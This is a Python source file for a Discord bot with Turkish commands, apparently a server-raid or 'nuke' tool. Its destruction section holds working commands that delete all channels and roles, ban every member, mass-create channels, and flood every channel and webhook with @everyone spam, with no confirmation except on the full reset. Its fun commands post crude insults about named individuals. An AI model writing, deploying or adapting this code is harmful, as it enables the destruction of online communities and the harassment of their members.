import discord
from discord.ext import commands
import asyncio
import os
import random
import aiohttp
import io
import json
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot aktif!"

def run_web():
    app.run(host='0.0.0.0', port=8080)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

spam_aktif = False
silme_aktif = False

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="!yardım"))
    print(f'✅ Bot hazır: {bot.user}')

@bot.event
async def on_command_error(ctx, error):
    print(f"Hata: {error}")
    await ctx.send(f"❌ Hata: {str(error)[:100]}")

# ========================
# YIKIM KOMUTLARI
# ========================

@bot.command()
async def sl(ctx):
    global silme_aktif
    if silme_aktif:
        await ctx.send("⚠️ Zaten silme işlemi aktif.")
        return
    silme_aktif = True
    await ctx.send("🗑️ Tüm kanallar 0.3 saniye arayla siliniyor... (!sildur ile durdur)")
    for kanal in ctx.guild.channels:
        if not silme_aktif:
            break
        try:
            await kanal.delete()
            await asyncio.sleep(0.3)
        except:
            pass
    silme_aktif = False
    await ctx.send("✅ Kanallar silme işlemi tamamlandı veya durduruldu.")

@bot.command()
async def sildur(ctx):
    global silme_aktif
    silme_aktif = False
    await ctx.send("🛑 Kanal silme durduruldu.")

@bot.command()
async def slhepsi(ctx):
    await ctx.send("💥 Tüm kanallar tek seferde siliniyor...")
    kanallar = ctx.guild.channels
    basarili = 0
    basarisiz = 0
    for kanal in kanallar:
        try:
            await kanal.delete()
            basarili += 1
        except:
            basarisiz += 1
    await ctx.send(f"✅ **{basarili}** kanal silindi.\n❌ **{basarisiz}** kanal silinemedi.")

@bot.command()
async def spamwebhook(ctx):
    global spam_aktif
    if spam_aktif:
        await ctx.send("⚠️ Zaten spam aktif.")
        return
    await ctx.send("🔧 Webhook'lar oluşturuluyor...")
    webhooklar = []
    for kanal in ctx.guild.text_channels:
        try:
            webhook = await kanal.create_webhook(name="SpamBot")
            webhooklar.append(webhook)
        except:
            pass
    if not webhooklar:
        await ctx.send("❌ Hiçbir kanala webhook oluşturulamadı!")
        return
    spam_aktif = True
    await ctx.send(f"⚡ SÜPER HIZLI webhook spam başladı! {len(webhooklar)} webhook ile (!dur ile durdur)")
    sayac = 0
    while spam_aktif:
        for i in range(0, len(webhooklar), 5):
            if not spam_aktif:
                break
            grup = webhooklar[i:i+5]
            tasks = []
            for webhook in grup:
                tasks.append(webhook.send("@everyone **Valdo/Klowinc Siker .d**", username="Valdo/Klowinc"))
            await asyncio.gather(*tasks, return_exceptions=True)
            sayac += len(grup)
            await asyncio.sleep(0.3)
        if sayac % 50 == 0:
            await ctx.send(f"📊 {sayac} mesaj gönderildi!")
    for webhook in webhooklar:
        try:
            await webhook.delete()
        except:
            pass
    await ctx.send(f"✅ Spam durduruldu! Toplam {sayac} mesaj gönderildi.")

@bot.command()
async def spam(ctx):
    global spam_aktif
    if spam_aktif:
        await ctx.send("⚠️ Zaten spam aktif.")
        return
    spam_aktif = True
    await ctx.send("🔊 Hızlı spam başladı! (!dur ile durdur)")
    while spam_aktif:
        tasks = []
        for kanal in ctx.guild.text_channels:
            tasks.append(kanal.send("@everyone **Valdo/Klowinc Siker .d**"))
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.5)
    await ctx.send("✅ Spam durduruldu.")

@bot.command()
async def spamyavas(ctx):
    global spam_aktif
    if spam_aktif:
        await ctx.send("⚠️ Zaten spam aktif.")
        return
    spam_aktif = True
    await ctx.send("🐢 Yavaş spam başladı! (!dur ile durdur)")
    while spam_aktif:
        for kanal in ctx.guild.text_channels:
            if not spam_aktif:
                break
            try:
                await kanal.send("@everyone **Valdo/Klowinc Siker .d**")
            except:
                pass
        await asyncio.sleep(0.5)
    await ctx.send("✅ Spam durduruldu.")

@bot.command()
async def dur(ctx):
    global spam_aktif
    spam_aktif = False
    await ctx.send("🛑 Spam durduruldu.")

@bot.command()
async def roluştur(ctx, *, isim):
    try:
        rol = await ctx.guild.create_role(name=isim)
        await ctx.send(f"✅ `{rol.name}` adlı rol oluşturuldu!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def rolsil(ctx, rol: discord.Role):
    try:
        await rol.delete()
        await ctx.send(f"✅ `{rol.name}` adlı rol silindi!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def rolver(ctx, member: discord.Member, rol: discord.Role):
    try:
        await member.add_roles(rol)
        await ctx.send(f"✅ {member.mention} adlı kişiye `{rol.name}` rolü verildi!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def rolat(ctx, member: discord.Member, rol: discord.Role):
    try:
        await member.remove_roles(rol)
        await ctx.send(f"✅ {member.mention} adlı kişiden `{rol.name}` rolü alındı!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def everyone(ctx, *, mesaj):
    await ctx.send(f"@everyone {mesaj}")

@bot.command()
async def dm(ctx, member: discord.Member, *, mesaj):
    try:
        await member.send(mesaj)
        await ctx.send(f"✅ {member.mention} adlı kişiye DM gönderildi!")
    except:
        await ctx.send(f"❌ {member.mention} adlı kişiye DM gönderilemedi.")

@bot.command()
async def kanalkilit(ctx):
    for kanal in ctx.guild.text_channels:
        try:
            await kanal.set_permissions(ctx.guild.default_role, send_messages=False)
        except:
            pass
    await ctx.send("🔒 Tüm kanallar kilitlendi!")

@bot.command()
async def kanalaç(ctx):
    for kanal in ctx.guild.text_channels:
        try:
            await kanal.set_permissions(ctx.guild.default_role, send_messages=None)
        except:
            pass
    await ctx.send("🔓 Tüm kanalların kilidi açıldı!")

@bot.command()
async def kanaloluştur(ctx, *, isim):
    try:
        await ctx.guild.create_text_channel(isim)
        await ctx.send(f"✅ `{isim}` adlı kanal oluşturuldu!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def kanalsil(ctx, kanal: discord.TextChannel):
    try:
        await kanal.delete()
        await ctx.send(f"✅ `{kanal.name}` adlı kanal silindi!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def kategorisil(ctx, kategori_adi: str):
    kategori = discord.utils.get(ctx.guild.categories, name=kategori_adi)
    if not kategori:
        await ctx.send("❌ Böyle bir kategori bulunamadı!")
        return
    sayac = 0
    for kanal in kategori.channels:
        try:
            await kanal.delete()
            sayac += 1
        except:
            pass
    await kategori.delete()
    await ctx.send(f"✅ `{kategori_adi}` kategorisi ve {sayac} kanal silindi!")

@bot.command()
async def tumrollersil(ctx):
    sayac = 0
    for rol in ctx.guild.roles:
        if rol.name == "@everyone":
            continue
        try:
            await rol.delete()
            sayac += 1
        except:
            pass
    await ctx.send(f"✅ {sayac} rol silindi!")

@bot.command()
async def sunucubosalt(ctx):
    await ctx.send("💀 Tüm üyeler banlanıyor...")
    sayac = 0
    for member in ctx.guild.members:
        if member == ctx.author or member == ctx.guild.me:
            continue
        try:
            await member.ban(reason="Sunucu boşaltma işlemi")
            sayac += 1
        except:
            pass
    await ctx.send(f"✅ {sayac} üye banlandı!")

@bot.command()
async def rastgeleat(ctx, sayi: int = 1):
    uyeler = [uye for uye in ctx.guild.members if not uye.bot and uye != ctx.author]
    if len(uyeler) < sayi:
        await ctx.send("❌ Yeterli üye yok!")
        return
    secilen = random.sample(uyeler, sayi)
    sayac = 0
    for uye in secilen:
        try:
            await uye.kick(reason="Rastgele atma işlemi")
            sayac += 1
        except:
            pass
    await ctx.send(f"✅ {sayac} üye rastgele atıldı!")

@bot.command()
async def kanalpatlat(ctx, sayi: int, *, isim: str = "patlama"):
    sayac = 0
    await ctx.send(f"🔨 {sayi} kanal oluşturuluyor...")
    for i in range(sayi):
        try:
            await ctx.guild.create_text_channel(f"{isim}-{i+1}")
            sayac += 1
        except:
            pass
    await ctx.send(f"✅ {sayac} kanal oluşturuldu!")

@bot.command()
async def sunucuismi(ctx, *, yeni_isim):
    try:
        await ctx.guild.edit(name=yeni_isim)
        await ctx.send(f"✅ Sunucu ismi `{yeni_isim}` olarak değiştirildi!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def servericon(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Lütfen bir resim dosyası gönder!")
        return
    dosya = ctx.message.attachments[0]
    if not dosya.content_type.startswith('image/'):
        await ctx.send("❌ Lütfen geçerli bir resim dosyası gönder!")
        return
    try:
        resim = await dosya.read()
        await ctx.guild.edit(icon=resim)
        await ctx.send("✅ Sunucu profil fotoğrafı başarıyla değiştirildi!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def servername(ctx, *, yeni_isim):
    try:
        await ctx.guild.edit(name=yeni_isim)
        await ctx.send(f"✅ Sunucu ismi başarıyla **{yeni_isim}** olarak değiştirildi!")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

@bot.command()
async def sıfırla(ctx):
    await ctx.send("☢️ **SUNUCU SIFIRLANIYOR!** Bu işlem geri alınamaz.\n\n**Devam etmek için 10 saniye içinde `evet` yazın.**")
    def onay_kontrol(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "evet"
    try:
        await bot.wait_for('message', timeout=10.0, check=onay_kontrol)
    except asyncio.TimeoutError:
        await ctx.send("⏰ İşlem iptal edildi.")
        return
    await ctx.send("💥 **SUNUCU SIFIRLANIYOR...**")
    kanal_sayac = 0
    for kanal in ctx.guild.channels:
        try:
            await kanal.delete()
            kanal_sayac += 1
        except:
            pass
    rol_sayac = 0
    for rol in ctx.guild.roles:
        if rol.name != "@everyone":
            try:
                await rol.delete()
                rol_sayac += 1
            except:
                pass
    uye_sayac = 0
    for member in ctx.guild.members:
        if member == ctx.guild.me or member == ctx.author:
            continue
        try:
            await member.ban(reason="Sunucu sıfırlama işlemi")
            uye_sayac += 1
        except:
            pass
    try:
        await ctx.guild.edit(name="🔥 SIFIRLANDI")
    except:
        pass
    try:
        yeni_kanal = await ctx.guild.create_text_channel("sifirlandi")
        await yeni_kanal.send(
            f"💀 **SUNUCU SIFIRLANDI!**\n\n"
            f"✅ **{kanal_sayac}** kanal silindi.\n"
            f"✅ **{rol_sayac}** rol silindi.\n"
            f"✅ **{uye_sayac}** üye banlandı.\n\n"
            f"Sunucu sıfırlandı. Geriye sadece sen kaldın, kral! 👑"
        )
    except:
        print("Sunucu sıfırlandı.")

# ========================
# YEDEKLEME VE GERİ YÜKLEME (BİREBİR)
# ========================

@bot.command()
async def sunucuyedekle(ctx):
    await ctx.send("📦 Sunucu yedekleniyor...")
    veri = {
        "sunucu_ismi": ctx.guild.name,
        "sunucu_id": ctx.guild.id,
        "kanallar": [],
        "roller": []
    }
    for kanal in ctx.guild.channels:
        try:
            kanal_verisi = {
                "isim": kanal.name,
                "id": kanal.id,
                "tip": str(kanal.type),
                "konum": kanal.position,
                "kategori_id": kanal.category.id if kanal.category else None
            }
            veri["kanallar"].append(kanal_verisi)
        except:
            pass
    for rol in ctx.guild.roles:
        try:
            rol_verisi = {
                "isim": rol.name,
                "id": rol.id,
                "renk": str(rol.color),
                "konum": rol.position,
                "yetkiler": rol.permissions.value
            }
            veri["roller"].append(rol_verisi)
        except:
            pass
    dosya_adi = f"yedek_{ctx.guild.id}.json"
    with open(dosya_adi, "w", encoding="utf-8") as f:
        json.dump(veri, f, indent=2, ensure_ascii=False)
    await ctx.send(file=discord.File(dosya_adi))
    os.remove(dosya_adi)
    await ctx.send("✅ Sunucu yedeklendi!")

@bot.command()
async def yedektenyukle(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Lütfen bir yedek JSON dosyası gönder!")
        return
    dosya = ctx.message.attachments[0]
    if not dosya.filename.endswith('.json'):
        await ctx.send("❌ Lütfen geçerli bir JSON dosyası gönder!")
        return
    await ctx.send("🔄 Sunucu birebir geri yükleniyor...")
    try:
        veri = await dosya.read()
        yedek = json.loads(veri)
        await ctx.guild.edit(name=yedek["sunucu_ismi"])
        await ctx.send(f"✅ Sunucu ismi güncellendi: **{yedek['sunucu_ismi']}**")
        # Rolleri oluştur
        await ctx.send("🎭 Roller oluşturuluyor...")
        yeni_roller = {}
        for rol_verisi in yedek["roller"]:
            try:
                renk = discord.Color(int(rol_verisi["renk"].replace("#", ""), 16))
                yeni_rol = await ctx.guild.create_role(
                    name=rol_verisi["isim"],
                    color=renk,
                    permissions=discord.Permissions(rol_verisi.get("yetkiler", 0))
                )
                yeni_roller[rol_verisi["id"]] = yeni_rol
                await asyncio.sleep(0.3)
            except:
                pass
        for rol_verisi in yedek["roller"]:
            try:
                rol = yeni_roller.get(rol_verisi["id"])
                if rol:
                    await rol.edit(position=rol_verisi.get("konum", 0))
            except:
                pass
        await ctx.send(f"✅ {len(yeni_roller)} rol oluşturuldu.")
        # Kategorileri oluştur
        await ctx.send("📁 Kategoriler oluşturuluyor...")
        kategori_ids = {}
        kategoriler = [k for k in yedek["kanallar"] if k["tip"] == "category"]
        for kat_verisi in kategoriler:
            try:
                yeni_kat = await ctx.guild.create_category(kat_verisi["isim"])
                kategori_ids[kat_verisi["id"]] = yeni_kat
                await asyncio.sleep(0.3)
            except:
                pass
        for kat_verisi in kategoriler:
            try:
                kat = kategori_ids.get(kat_verisi["id"])
                if kat:
                    await kat.edit(position=kat_verisi.get("konum", 0))
            except:
                pass
        await ctx.send(f"✅ {len(kategori_ids)} kategori oluşturuldu.")
        # Kanalları oluştur
        await ctx.send("💬 Kanallar oluşturuluyor...")
        kanal_sayac = 0
        kanallar = [k for k in yedek["kanallar"] if k["tip"] != "category"]
        for kanal_verisi in kanallar:
            try:
                kategori_hedef = kategori_ids.get(kanal_verisi.get("kategori_id"))
                if kanal_verisi["tip"] == "text":
                    await ctx.guild.create_text_channel(kanal_verisi["isim"], category=kategori_hedef)
                    kanal_sayac += 1
                elif kanal_verisi["tip"] == "voice":
                    await ctx.guild.create_voice_channel(kanal_verisi["isim"], category=kategori_hedef)
                    kanal_sayac += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"✅ {kanal_sayac} kanal oluşturuldu.")
        # Kanalların konumlarını ayarla
        for kanal_verisi in kanallar:
            try:
                kanal = discord.utils.get(ctx.guild.channels, id=kanal_verisi["id"])
                if kanal:
                    await kanal.edit(position=kanal_verisi.get("konum", 0))
            except:
                pass
        await ctx.send("✅ **Sunucu birebir geri yüklendi!**")
    except Exception as e:
        await ctx.send(f"❌ Hata: {e}")

# ========================
# EĞLENCE KOMUTLARI
# ========================

@bot.command()
async def valdo(ctx):
    await ctx.send("YARRAMM VALDO BU KIM AMK")

@bot.command()
async def gonu(ctx):
    await ctx.send("2 GUNDE 48 CK ATAN ADAM")

@bot.command()
async def eternal(ctx):
    await ctx.send("FURKANIN NAMIDEGER BABASI")

@bot.command()
async def klowinc(ctx):
    await ctx.send("BU ADAMIN TASSAKLARINA BETON YETMEZ")

@bot.command()
async def doruk(ctx):
    await ctx.send("ARİEL BABAAAA")

@bot.command()
async def atam(ctx):
    try:
        await ctx.send(file=discord.File('ataturk.jpg'))
    except:
        await ctx.send("❌ ataturk.jpg bulunamadı.")

@bot.command()
async def furkandomalma(ctx):
    try:
        await ctx.send(file=discord.File('furkandomalma.jpg'))
    except:
        await ctx.send("❌ furkandomalma.jpg bulunamadı.")

@bot.command()
async def furkanvideo(ctx):
    try:
        await ctx.send(file=discord.File('furkan.mp4'))
    except:
        await ctx.send("❌ furkan.mp4 bulunamadı.")

@bot.command()
async def zar(ctx):
    sonuc = random.randint(1, 6)
    zar_emoji = ["⚀", "⚁", "⚂", "⚃", "⚄", "⚅"]
    embed = discord.Embed(title="🎲 Zar", description=f"**{sonuc}** {zar_emoji[sonuc-1]}", color=discord.Color.blue())
    await ctx.send(embed=embed)

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(title="🏓 Pong!", description=f"Gecikme: **{latency}ms**", color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.command()
async def yardım(ctx):
    embed = discord.Embed(
        title="📋 Komut Listesi",
        description="Valdo/Klowinc Bot - Tüm komutlar",
        color=discord.Color.blue()
    )
    embed.add_field(name="⚠️ YIKIM", value="`!sl`, `!sildur`, `!slhepsi`, `!spamwebhook`, `!spam`, `!spamyavas`, `!dur`, `!rololuştur`, `!rolsil`, `!rolver`, `!rolat`, `!everyone`, `!dm`, `!kanalkilit`, `!kanalaç`, `!kanaloluştur`, `!kanalsil`, `!kategorisil`, `!tumrollersil`, `!sunucubosalt`, `!rastgeleat`, `!kanalpatlat`, `!sunucuismi`, `!servericon`, `!servername`, `!sıfırla`", inline=False)
    embed.add_field(name="📦 YEDEKLEME", value="`!sunucuyedekle` - Sunucuyu yedekler\n`!yedektenyukle` - Yedekten geri yükler", inline=False)
    embed.add_field(name="😂 EĞLENCE", value="`!valdo`, `!gonu`, `!eternal`, `!klowinc`, `!doruk`, `!atam`, `!furkandomalma`, `!furkanvideo`, `!zar`, `!ping`", inline=False)
    embed.set_footer(text="Herhangi bir sorunda yöneticiye başvur.")
    await ctx.send(embed=embed)

# ========================
# BAŞLATMA
# ========================

if __name__ == "__main__":
    Thread(target=run_web).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
        print("❌ DISCORD_TOKEN ayarlanmamış!")